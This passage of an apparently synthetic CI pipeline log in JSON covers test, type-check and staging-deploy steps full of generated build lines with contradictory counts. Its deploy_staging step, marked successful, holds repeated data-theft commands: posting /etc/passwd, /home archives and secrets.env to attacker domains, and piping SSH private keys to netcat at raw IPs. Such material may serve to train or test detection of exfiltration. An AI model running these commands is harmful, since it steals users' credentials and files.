          "pip install: Successfully installed eslint-4.7",
          "[12:47:23] DEBUG: Connection pool: 6 active",
          "Cache restored successfully (308MB)",
          "TLS handshake completed",
          "Compiling components/handler.rs...",
          "Artifact uploaded: dist.zip (93MB)",
          "POST /api - 201 (469ms)",
          "Completed.",
          "WARNING: axios has known vulnerabilities",
          "Compiling lib/app.ts...",
          "Building Docker image...",
          "[12:47:23] ERROR: Connection failed",
          "pip: Downloading prettier-3.2.tar.gz",
          "OK",
          "[12:47:23] DEBUG: Connection pool: 1 active",
          "Installing express@2.12.7",
          "Bundling styles.css",
          "Success!",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Time: 110.891s",
          "Fetching from https://github.com/package.json",
          "FAILED: test_db_connect",
          "FAILED: test_cache_hit",
          "Compiling utils/utils.go...",
          "Environment: production",
          "Platform: darwin-arm64",
          "Checking out develop branch",
          "\u2713 Step 'test' succeeded",
          "[12:47:23] DEBUG: Query executed in 77ms",
          "Ran 42 tests in 55s",
          "[12:47:23] DEBUG: Initializing service",
          "Compiling utils/app.ts...",
          "[12:47:23] INFO: Processing request",
          "Pushing to registry...",
          "[12:47:23] INFO: Processing request",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:23] DEBUG: Initializing service",
          "[12:47:23] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "npm install: added 185 packages",
          "yarn add: Done in 21.89s",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Uploading artifact 'dist' (48 files)",
          "Tests: 113 passed, 293 total",
          "Pushing to registry...",
          "Artifact downloaded: 26MB",
          "Already up to date.",
          "GET /health - 204 (63ms)",
          "\u2713 test completed",
          "Cache saved successfully",
          "Layer 6/13: RUN command",
          "Processing...",
          "  PASS: test_auth_login (303ms)",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:47:23] DEBUG: Memory usage: 341MB",
          "Test Suites: 31 passed, 30 total",
          "GET /health - 201 (3ms)",
          "\u2713 All checks passed",
          "Switched to branch 'hotfix/task-924'",
          "Success!",
          "Completed.",
          "Step 6/18: Deploying",
          "Using Node.js 16.9.5",
          "yarn add: Done in 10.6s",
          "Already up to date.",
          "[12:47:23] DEBUG: Initializing service",
          "HEAD is now at 376b3ec",
          "[12:47:23] DEBUG: Initializing service",
          "[12:47:23] DEBUG: Query executed in 26ms",
          "GET /api - 201 (65ms)",
          "Building Docker image...",
          "Bundling styles.js",
          "POST /api - 200 (354ms)",
          "Installing axios@5.4.5",
          "Generating source maps...",
          "Step 11/21: Building",
          "[12:47:23] INFO: Processing request",
          "Loading...",
          "Creating production build...",
          "  PASS: test_auth_login (201ms)",
          "Step 10/21: Testing",
          "Step 9/22: Deploying",
          "pip: Collecting express",
          "Switched to branch 'feature/task-730'",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Processing...",
          "Loading...",
          "\u2713 Task completed in 1806ms",
          "Step 17/17: Deploying",
          "HEAD is now at a218abe",
          "Step 8/22: Testing",
          "Image pulled successfully",
          "\u2713 lint completed",
          "Cache hit for key-3087",
          "Tests: 112 passed, 311 total",
          "Step 9/15: Linting",
          "Step 11/18: Installing dependencies",
          "Bundling styles.js",
          "Done.",
          "Uploading artifact 'build' (26 files)",
          "[12:47:23] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Completed.",
          "Fetching from https://amazonaws.com/package.json",
          "Image pulled successfully",
          "Using Node.js 14.17.0",
          "Step 20/15: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Processing...",
          "[12:47:23] DEBUG: Loading configuration",
          "  PASS: test_api_health (177ms)",
          "[12:47:23] INFO: Cache refreshed",
          "Cache miss for key-6249",
          "Compiling components/index.js...",
          "npm install: resolved 1433 packages",
          "[12:47:23] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 6/18: Testing",
          "Connection established",
          "Layer 6/8: RUN command",
          "Platform: linux-x64",
          "\u2713 Task completed in 663ms",
          "Artifact uploaded: dist.zip (49MB)",
          "Optimizing 87 modules...",
          "[12:47:23] WARN: Deprecated API usage",
          "Verifying...",
          "Using Node.js 14.15.8",
          "[12:47:23] WARN: Deprecated API usage",
          "Done.",
          "Loading...",
          "Installing react@2.11.0",
          "Verifying...",
          "GET /health - 200 (27ms)",
          "Step 19/15: Running migrations",
          "Minifying main.js",
          "npm notice: package.json updated",
          "Step 15/22: Testing",
          "[12:47:23] WARN: Deprecated API usage",
          "HEAD is now at 1c98cd4",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "Exception: RuntimeError",
          "OK",
          "[12:47:23] INFO: Starting build process",
          "Optimizing 61 modules...",
          "Building Docker image...",
          "Ran 152 tests in 12s",
          "Ran 22 tests in 2s",
          "Building Docker image...",
          "Image pulled successfully",
          "Generating source maps...",
          "[12:47:23] WARN: Deprecated API usage",
          "Using Python 3.9",
          "  PASS: unit/test_api_health.spec.js",
          "Cache miss for key-7792",
          "OK",
          "Waiting...",
          "Verifying...",
          "Image pulled successfully",
          "  PASS: test_db_connect (59ms)",
          "Cache miss for key-9751",
          "[12:47:23] INFO: Connecting to database",
          "Pushing to registry...",
          "pip install: Successfully installed axios-1.11",
          "Finished.",
          "Compiling components/utils.go...",
          "Tests: 431 passed, 246 total",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-25T12:50:22.324960",
        "finished_at": "2025-11-25T12:50:38.555688",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:47:23] DEBUG: Query executed in 28ms",
          "npm install: added 188 packages",
          "pip: Installing build dependencies...",
          "[12:47:23] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "yarn add: Done in 16.58s",
          "Image pulled successfully",
          "Step 8/16: Installing dependencies",
          "pip: Collecting lodash",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:23] DEBUG: Memory usage: 1690MB",
          "Test Suites: 46 passed, 25 total",
          "TLS handshake completed",
          "Step 8/15: Running migrations",
          "[12:47:23] DEBUG: Connection pool: 18 active",
          "Verifying...",
          "[12:47:23] DEBUG: Query executed in 80ms",
          "Building Docker image...",
          "Step 11/17: Installing dependencies",
          "Finished.",
          "Installing prettier@5.18.4",
          "Processing...",
          "  PASS: unit/test_user_create.spec.js",
          "HEAD is now at 3d4f823",
          "Generating source maps...",
          "npm install: resolved 661 packages",
          "Using Python 3.10",
          "Transforming 291 files...",
          "Platform: linux-x64",
          "Waiting...",
          "TLS handshake completed",
          "Already up to date.",
          "WARNING: lodash has known vulnerabilities",
          "Snapshots: 32 passed, 10 total",
          "Step 6/16: Building",
          "Minifying main.js",
          "\u2717 build failed with exit code 18",
          "[12:47:23] INFO: Starting build process",
          "npm install: added 418 packages",
          "  PASS: test_cache_hit (424ms)",
          "Image pulled successfully",
          "Environment: staging",
          "Coverage: 74% statements, 63% branches",
          "Step 14/15: Installing dependencies",
          "Using Python 3.12",
          "Completed.",
          "Processing...",
          "OK",
          "Verifying...",
          "TLS handshake completed",
          "Pulling image: node:18",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-8185",
          "npm install: added 406 packages",
          "Compiling lib/utils.go...",
          "Step 4/22: Installing dependencies",
          "Step 7/18: Running migrations",
          "npm notice: created a lockfile",
          "Already up to date.",
          "[12:47:23] DEBUG: Memory usage: 1390MB",
          "Switched to branch 'bugfix/task-562'",
          "Using Node.js 19.14.9",
          "NODE_ENV=production",
          "[12:47:23] ERROR: Connection failed",
          "Step 13/19: Installing dependencies",
          "Step 5/25: Linting",
          "Coverage: 88% statements, 87% branches",
          "OK",
          "Ran 125 tests in 24s",
          "[12:47:23] WARN: Deprecated API usage",
          "Creating production build...",
          "Cache miss for key-1400",
          "OK",
          "TLS handshake completed",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "Installing axios@2.0.3",
          "pip install: Successfully installed react-4.12",
          "Step 20/23: Testing",
          "Checking out main branch",
          "WARNING: axios has known vulnerabilities",
          "[12:47:23] DEBUG: Loading configuration",
          "Loading...",
          "Bundling vendor.css",
          "[12:47:23] DEBUG: Query executed in 44ms",
          "OK",
          "Already up to date.",
          "\u2713 Step 'setup' succeeded",
          "Cache restored successfully (236MB)",
          "Compiling src/service.java...",
          "[12:47:23] DEBUG: Loading configuration",
          "yarn add: Done in 25.26s",
          "\u2717 build failed with exit code 79",
          "Optimizing 53 modules...",
          "[12:47:23] ERROR: Connection failed",
          "Cache saved successfully",
          "Coverage: 82% statements, 64% branches",
          "Cache restored successfully (247MB)",
          "Finished.",
          "Ran 62 tests in 7s",
          "\u2713 Step 'install' succeeded",
          "WARNING: lodash has known vulnerabilities",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed webpack-5.11",
          "Switched to branch 'bugfix/task-109'",
          "WARNING: prettier has known vulnerabilities",
          "Compiling utils/app.ts...",
          "[12:47:23] INFO: Cache refreshed",
          "[12:47:23] INFO: Request completed",
          "[12:47:23] WARN: Deprecated API usage",
          "[12:47:23] INFO: Starting build process",
          "Checking out master branch",
          "pip install: Successfully installed axios-2.16",
          "Pushing to registry...",
          "Generating source maps...",
          "Step 18/22: Deploying",
          "Already up to date.",
          "Step 5/23: Deploying",
          "Cache restored successfully (123MB)",
          "  PASS: integration/test_cache_hit.spec.js",
          "GET /status - 201 (56ms)",
          "yarn add: Done in 29.16s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "GET /api - 201 (54ms)",
          "[12:47:23] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "Pushing to registry...",
          "Minifying vendor.js",
          "TLS handshake completed",
          "Step 10/23: Deploying",
          "Step 7/16: Installing dependencies",
          "[12:47:23] INFO: Cache refreshed",
          "Ready.",
          "[12:47:23] INFO: Processing request",
          "npm notice: package.json updated",
          "Minifying app.js",
          "  PASS: e2e/test_api_health.spec.js",
          "Finished.",
          "Optimizing 36 modules...",
          "[12:47:23] INFO: Cache refreshed",
          "Cache invalidated: build",
          "pip: Collecting webpack",
          "Step 6/24: Building",
          "\u2713 Task completed in 2563ms",
          "Artifact downloaded: 20MB",
          "pip: Downloading prettier-2.12.tar.gz",
          "Creating production build...",
          "Done.",
          "npm install: added 443 packages",
          "Layer 4/15: COPY command",
          "Image pulled successfully",
          "npm install: added 50 packages",
          "Artifact uploaded: dist.zip (95MB)",
          "npm install: resolved 1765 packages",
          "Test Suites: 33 passed, 35 total",
          "Step 12/22: Testing",
          "Environment: staging",
          "Test Suites: 9 passed, 39 total",
          "Switched to branch 'bugfix/task-821'",
          "Uploading artifact 'build' (43 files)",
          "Environment: development",
          "Snapshots: 5 passed, 44 total",
          "Finished.",
          "GET /status - 204 (80ms)",
          "Fetching submodules...",
          "[12:47:23] DEBUG: Loading configuration",
          "[12:47:23] INFO: Cache refreshed",
          "Success!",
          "pip: Installing build dependencies...",
          "Uploading artifact 'coverage' (26 files)",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:47:23] ERROR: Connection failed",
          "TLS handshake completed",
          "\u2713 Task completed in 3640ms",
          "pip: Installing build dependencies...",
          "[12:47:23] ERROR: Connection failed",
          "pip: Downloading webpack-4.3.tar.gz",
          "Generating source maps...",
          "[12:47:23] WARN: Deprecated API usage",
          "\u2713 Task completed in 4660ms",
          "Coverage: 82% statements, 77% branches",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-25T12:50:38.555688",
        "finished_at": "2025-11-25T12:51:11.017144",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Coverage: 76% statements, 69% branches",
          "[12:47:23] INFO: Processing request",
          "Switched to branch 'bugfix/task-422'",
          "Bundling vendor.js",
          "[12:47:23] DEBUG: Query executed in 29ms",
          "Switched to branch 'hotfix/task-614'",
          "[12:47:23] INFO: Connecting to database",
          "pip: Downloading jest-1.1.tar.gz",
          "[12:47:23] INFO: Request completed",
          "Tests: 106 passed, 409 total",
          "Platform: linux-x64",
          "[12:47:23] INFO: Cache refreshed",
          "Cache invalidated: node_modules",
          "Connection established",
          "Bundling vendor.css",
          "POST /upload - 202 (463ms)",
          "[12:47:23] INFO: Connecting to database",
          "[12:47:23] DEBUG: Loading configuration",
          "[12:47:23] INFO: Processing request",
          "Compiling components/app.ts...",
          "Platform: win32-x64",
          "Fetching from https://docker.io/package.json",
          "Connection established",
          "Snapshots: 6 passed, 7 total",
          "[12:47:23] INFO: Processing request",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading express-5.11.tar.gz",
          "Snapshots: 16 passed, 6 total",
          "[12:47:23] INFO: Cache refreshed",
          "Coverage: 89% statements, 78% branches",
          "WARNING: react has known vulnerabilities",
          "Compiling components/app.ts...",
          "\u2717 build failed with exit code 112",
          "[12:47:23] DEBUG: Loading configuration",
          "Already up to date.",
          "Uploading artifact 'dist' (12 files)",
          "[12:47:23] DEBUG: Connection pool: 3 active",
          "Test Suites: 19 passed, 48 total",
          "\u2713 test completed",
          "Test Suites: 42 passed, 31 total",
          "Step 20/20: Running migrations",
          "Fetching submodules...",
          "Compiling utils/app.ts...",
          "[12:47:23] DEBUG: Initializing service",
          "Time: 48.9s",
          "  PASS: test_api_health (444ms)",
          "WARNING: prettier has known vulnerabilities",
          "npm install: added 196 packages",
          "[12:47:23] INFO: Starting build process",
          "\u2717 build failed with exit code 60",
          "npm install: resolved 1110 packages",
          "Step 14/25: Installing dependencies",
          "Step 20/16: Running migrations",
          "Using Python 3.9",
          "Checking out master branch",
          "Test Suites: 44 passed, 41 total",
          "Checking out main branch",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Cache hit for key-7517",
          "Step 17/25: Installing dependencies",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-146'",
          "Switched to branch 'hotfix/task-605'",
          "Pulling image: alpine:latest",
          "Step 20/21: Installing dependencies",
          "Test Suites: 50 passed, 40 total",
          "Snapshots: 5 passed, 8 total",
          "Success!",
          "[12:47:23] INFO: Connecting to database",
          "Cache hit for key-6619",
          "Test Suites: 15 passed, 15 total",
          "\u2717 build failed with exit code 105",
          "[12:47:23] INFO: Cache refreshed",
          "GET /api - 200 (9ms)",
          "Layer 5/9: ENV command",
          "Compiling utils/service.java...",
          "Minifying vendor.js",
          "[12:47:23] INFO: Cache refreshed",
          "Using Python 3.9",
          "Step 14/15: Testing",
          "Fetching from https://npmjs.org/package.json",
          "[12:47:23] DEBUG: Initializing service",
          "Step 20/21: Linting",
          "Tests: 347 passed, 438 total",
          "Optimizing 65 modules...",
          "Cache miss for key-1558",
          "Uploading artifact 'build' (16 files)",
          "Using Python 3.10",
          "[12:47:23] INFO: Processing request",
          "[12:47:23] DEBUG: Query executed in 6ms",
          "pip: Downloading lodash-2.14.tar.gz",
          "[12:47:23] DEBUG: Query executed in 24ms",
          "npm notice: created a lockfile",
          "npm install: resolved 458 packages",
          "Compiling lib/index.js...",
          "Tests: 144 passed, 181 total",
          "Uploading artifact 'build' (38 files)",
          "Pushing to registry...",
          "Image pulled successfully",
          "[12:47:23] WARN: Deprecated API usage",
          "pip: Downloading prettier-5.7.tar.gz",
          "Verifying...",
          "Cache restored successfully (23MB)",
          "Cache hit for key-6494",
          "Waiting...",
          "npm install: resolved 1178 packages",
          "npm notice: package.json updated",
          "HEAD is now at 74bf537",
          "npm notice: created a lockfile",
          "  PASS: test_api_health (450ms)",
          "Exception: ValueError",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Cache miss for key-2696",
          "Pulling image: python:18",
          "Completed.",
          "Environment: staging",
          "Test Suites: 36 passed, 9 total",
          "\u2713 All checks passed",
          "[12:47:23] INFO: Connecting to database",
          "\u2713 Step 'test' succeeded",
          "npm notice: package.json updated",
          "Processing...",
          "Environment: production",
          "Cache hit for key-7056",
          "npm install: resolved 394 packages",
          "[12:47:23] WARN: Deprecated API usage",
          "Step 15/15: Deploying",
          "Step 12/24: Testing",
          "Using Python 3.12",
          "WARNING: jest has known vulnerabilities",
          "Platform: darwin-arm64",
          "[12:47:23] WARN: Deprecated API usage",
          "Tests: 393 passed, 392 total",
          "yarn add: Done in 6.66s",
          "NODE_ENV=development",
          "Coverage: 96% statements, 89% branches",
          "Building Docker image...",
          "Fetching from https://pypi.org/package.json",
          "Cache restored successfully (475MB)",
          "WARNING: express has known vulnerabilities",
          "Compiling src/main.py...",
          "pip install: Successfully installed webpack-3.0",
          "Done.",
          "Fetching submodules...",
          "\u2713 Task completed in 3844ms",
          "pip: Installing build dependencies...",
          "  PASS: test_auth_login (385ms)",
          "Minifying app.js",
          "Artifact downloaded: 35MB",
          "Loading...",
          "GET /health - 204 (57ms)",
          "[12:47:23] WARN: Deprecated API usage",
          "Cache miss for key-4659",
          "Uploading artifact 'build' (29 files)",
          "Tests: 406 passed, 454 total",
          "[12:47:23] DEBUG: Loading configuration",
          "Completed.",
          "GET /api - 200 (83ms)",
          "Transforming 198 files...",
          "Completed.",
          "Transforming 554 files...",
          "Compiling utils/utils.go...",
          "[12:47:23] DEBUG: Connection pool: 20 active",
          "Platform: linux-x64",
          "[12:47:23] INFO: Request completed",
          "\u2713 All checks passed",
          "Step 15/24: Installing dependencies",
          "Processing...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u2717 build failed with exit code 33",
          "[12:47:23] ERROR: Connection failed",
          "Processing...",
          "yarn add: Done in 5.97s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Finished.",
          "Compiling components/app.ts...",
          "Time: 70.77s",
          "Fetching submodules...",
          "Platform: win32-x64",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-25T12:51:11.017144",
        "finished_at": "2025-11-25T12:51:27.247872",
        "log_lines": [
          "=== Step: type_check ===",
          "GET /status - 200 (63ms)",
          "Verifying...",
          "HEAD is now at 3874f77",
          "Step 16/16: Installing dependencies",
          "Cache hit for key-8982",
          "Snapshots: 31 passed, 28 total",
          "HEAD is now at 7fb9309",
          "Optimizing 11 modules...",
          "[12:47:23] DEBUG: Query executed in 74ms",
          "Step 15/24: Installing dependencies",
          "Pushing to registry...",
          "[12:47:23] ERROR: Connection failed",
          "Checking out master branch",
          "Artifact downloaded: 24MB",
          "Compiling lib/app.ts...",
          "npm notice: package.json updated",
          "Pulling image: node:18",
          "[12:47:23] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:23] ERROR: Connection failed",
          "Test Suites: 7 passed, 15 total",
          "Success!",
          "[12:47:23] DEBUG: Memory usage: 882MB",
          "Image pulled successfully",
          "pip install: Successfully installed express-1.15",
          "Connection established",
          "pip install: Successfully installed eslint-5.7",
          "Step 17/15: Building",
          "Snapshots: 41 passed, 30 total",
          "Done.",
          "Creating production build...",
          "Optimizing 44 modules...",
          "\u2713 Task completed in 3722ms",
          "Completed.",
          "\u2713 Step 'checkout' succeeded",
          "Uploading artifact 'build' (50 files)",
          "OK",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact downloaded: 48MB",
          "[12:47:23] DEBUG: Query executed in 38ms",
          "[12:47:23] DEBUG: Connection pool: 19 active",
          "[12:47:23] INFO: Processing request",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: e2e/test_api_health.spec.js",
          "\u2713 package completed",
          "  PASS: e2e/test_auth_login.spec.js",
          "Fetching from https://amazonaws.com/package.json",
          "Compiling components/app.ts...",
          "pip: Downloading lodash-2.11.tar.gz",
          "[12:47:23] WARN: Deprecated API usage",
          "[12:47:23] INFO: Starting build process",
          "Switched to branch 'feature/task-621'",
          "FAILED: test_db_connect",
          "Creating production build...",
          "Cache invalidated: dependencies",
          "[12:47:23] DEBUG: Connection pool: 12 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 9 passed, 12 total",
          "Done.",
          "Cache miss for key-2839",
          "npm notice: package.json updated",
          "[12:47:23] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:47:23] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Platform: win32-x64",
          "OK",
          "POST /data - 201 (396ms)",
          "Step 13/23: Installing dependencies",
          "Ready.",
          "npm notice: created a lockfile",
          "Building Docker image...",
          "pip install: Successfully installed axios-5.20",
          "[12:47:23] INFO: Starting build process",
          "Using Python 3.12",
          "Minifying vendor.js",
          "\u2713 Task completed in 3075ms",
          "Switched to branch 'hotfix/task-945'",
          "yarn add: Done in 9.22s",
          "Coverage: 77% statements, 96% branches",
          "[12:47:23] DEBUG: Loading configuration",
          "[12:47:23] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "NODE_ENV=production",
          "Completed.",
          "Bundling runtime.js",
          "[12:47:23] INFO: Starting build process",
          "npm notice: created a lockfile",
          "WARNING: webpack has known vulnerabilities",
          "Completed.",
          "pip: Collecting jest",
          "Coverage: 100% statements, 83% branches",
          "Coverage: 97% statements, 94% branches",
          "Transforming 758 files...",
          "Success!",
          "[12:47:23] DEBUG: Loading configuration",
          "NODE_ENV=development",
          "Success!",
          "Snapshots: 5 passed, 27 total",
          "Cache miss for key-8796",
          "Step 8/23: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 10/23: Deploying",
          "Tests: 425 passed, 227 total",
          "[12:47:23] DEBUG: Loading configuration",
          "Pulling image: node:18",
          "  PASS: integration/test_user_create.spec.js",
          "Artifact uploaded: build.tar.gz (14MB)",
          "FAILED: test_auth_login",
          "pip: Installing build dependencies...",
          "Compiling lib/index.js...",
          "Environment: production",
          "[12:47:23] ERROR: Connection failed",
          "Step 13/24: Running migrations",
          "[12:47:23] INFO: Starting build process",
          "Tests: 316 passed, 366 total",
          "pip: Downloading webpack-5.13.tar.gz",
          "  PASS: test_user_create (451ms)",
          "Layer 6/13: COPY command",
          "Ran 132 tests in 52s",
          "WARNING: eslint has known vulnerabilities",
          "npm install: resolved 473 packages",
          "Pulling image: node:latest",
          "\u2713 Task completed in 1603ms",
          "Coverage: 95% statements, 74% branches",
          "npm install: added 438 packages",
          "[12:47:23] DEBUG: Initializing service",
          "Success!",
          "Image pulled successfully",
          "Completed.",
          "\u2713 All checks passed",
          "Verifying...",
          "\u2713 Step 'checkout' succeeded",
          "[12:47:23] INFO: Cache refreshed",
          "Platform: darwin-arm64",
          "Optimizing 46 modules...",
          "Waiting...",
          "npm notice: package.json updated",
          "pip: Downloading webpack-2.14.tar.gz",
          "Ran 86 tests in 44s",
          "[12:47:23] DEBUG: Query executed in 53ms",
          "WARNING: webpack has known vulnerabilities",
          "Compiling components/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 819 files...",
          "Pulling image: node:latest",
          "FAILED: test_auth_login",
          "Compiling components/utils.go...",
          "[12:47:23] WARN: Deprecated API usage",
          "Optimizing 97 modules...",
          "[12:47:23] INFO: Connecting to database",
          "NODE_ENV=development",
          "Artifact uploaded: dist.zip (79MB)",
          "[12:47:23] ERROR: Connection failed",
          "Transforming 882 files...",
          "[12:47:23] DEBUG: Connection pool: 9 active",
          "Minifying main.js",
          "Completed.",
          "Pushing to registry...",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (134ms)",
          "[12:47:23] DEBUG: Query executed in 39ms",
          "\u2713 All checks passed",
          "Environment: test",
          "Step 19/15: Building",
          "Finished.",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache saved successfully",
          "Processing...",
          "Done.",
          "  PASS: unit/test_api_health.spec.js",
          "pip: Installing build dependencies...",
          "Cache hit for key-8675",
          "Pulling image: node:18",
          "\u2713 lint completed",
          "Bundling main.css",
          "Cache hit for key-2194",
          "HEAD is now at 31391e2",
          "Pulling image: node:18",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-25T12:51:27.247872",
        "finished_at": "2025-11-25T12:51:43.478600",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:47:23] INFO: Cache refreshed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Pushing to registry...",
          "POST /upload - 200 (333ms)",
          "Completed.",
          "pip install: Successfully installed webpack-3.17",
          "Using Node.js 19.14.10",
          "[12:47:23] ERROR: Connection failed",
          "Step 4/24: Building",
          "\u2713 build completed",
          "Success!",
          "npm install: resolved 110 packages",
          "  PASS: integration/test_auth_login.spec.js",
          "Optimizing 93 modules...",
          "Step 6/20: Testing",
          "Uploading artifact 'dist' (39 files)",
          "Installing jest@3.6.6",
          "Platform: win32-x64",
          "pip: Collecting eslint",
          "Artifact downloaded: 23MB",
          "Pushing to registry...",
          "Success!",
          "Sending 258MB of data to malicious-pool.xyz",
          "Cache saved successfully",
          "Step 8/19: Building",
          "Environment: test",
          "[12:47:23] DEBUG: Initializing service",
          "Bundling styles.js",
          "Creating production build...",
          "Using Python 3.9",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Environment: development",
          "npm install: added 331 packages",
          "npm install: added 365 packages",
          "Step 14/15: Running migrations",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "POST /data - 202 (377ms)",
          "Ran 140 tests in 3s",
          "Ready.",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "pip: Collecting axios",
          "pip install: Successfully installed react-2.11",
          "Step 7/15: Installing dependencies",
          "[12:47:23] INFO: Request completed",
          "Cache hit for key-8685",
          "Compiling src/app.ts...",
          "pip: Collecting eslint",
          "\u2713 All checks passed",
          "Sending 492MB of data to malicious-pool.xyz",
          "Compiling utils/main.py...",
          "\u2713 test completed",
          "[12:47:23] DEBUG: Memory usage: 1211MB",
          "pip: Downloading axios-1.9.tar.gz",
          "[12:47:23] INFO: Cache refreshed",
          "Waiting...",
          "Finished.",
          "\u2717 build failed with exit code 22",
          "Generating source maps...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Platform: darwin-arm64",
          "[12:47:23] DEBUG: Initializing service",
          "Step 9/18: Running migrations",
          "pip: Collecting express",
          "Snapshots: 20 passed, 12 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed prettier-1.11",
          "Creating production build...",
          "npm install: resolved 1093 packages",
          "Cache miss for key-1427",
          "\u2713 Task completed in 589ms",
          "npm notice: created a lockfile",
          "Sending 316MB of data to data-exfil.ru",
          "Waiting...",
          "  PASS: unit/test_api_health.spec.js",
          "Sending 497MB of data to evil-server.cc",
          "Switched to branch 'hotfix/task-439'",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Sending 458MB of data to malicious-pool.xyz",
          "Switched to branch 'feature/task-369'",
          "Verifying...",
          "Step 12/18: Running migrations",
          "Step 15/18: Running migrations",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Cache saved successfully",
          "Step 9/19: Linting",
          "Optimizing 18 modules...",
          "[12:47:23] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "Step 20/20: Building",
          "Sending 221MB of data to data-exfil.ru",
          "[12:47:23] WARN: Deprecated API usage",
          "pip: Collecting express",
          "Environment: test",
          "Creating production build...",
          "[12:47:23] DEBUG: Loading configuration",
          "Verifying...",
          "Compiling src/utils.go...",
          "Tests: 440 passed, 101 total",
          "pip: Downloading axios-3.1.tar.gz",
          "Layer 3/8: COPY command",
          "Installing prettier@1.15.8",
          "[12:47:23] DEBUG: Memory usage: 1211MB",
          "Transforming 116 files...",
          "GET /health - 201 (62ms)",
          "Snapshots: 47 passed, 12 total",
          "Compiling utils/handler.rs...",
          "WARNING: eslint has known vulnerabilities",
          "Platform: linux-x64",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (95ms)",
          "Step 10/16: Building",
          "NODE_ENV=development",
          "[12:47:23] INFO: Request completed",
          "Minifying vendor.js",
          "Artifact downloaded: 40MB",
          "Pulling image: python:latest",
          "Optimizing 85 modules...",
          "[12:47:23] DEBUG: Query executed in 100ms",
          "Image pulled successfully",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 235.205.169.38 25466",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:23] DEBUG: Initializing service",
          "Transforming 899 files...",
          "Platform: linux-x64",
          "Sending 104MB of data to evil-server.cc",
          "Verifying...",
          "GET /api - 200 (94ms)",
          "Cache restored successfully (267MB)",
          "HEAD is now at 00c7468",
          "Completed.",
          "[12:47:23] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 157.250.173.132 44680",
          "Switched to branch 'feature/task-322'",
          "Transforming 618 files...",
          "[12:47:23] DEBUG: Query executed in 45ms",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "TLS handshake completed",
          "Done.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (76MB)",
          "FAILED: test_cache_hit",
          "OK",
          "Compiling src/app.ts...",
          "npm install: resolved 1411 packages",
          "Pushing to registry...",
          "[12:47:23] DEBUG: Connection pool: 3 active",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
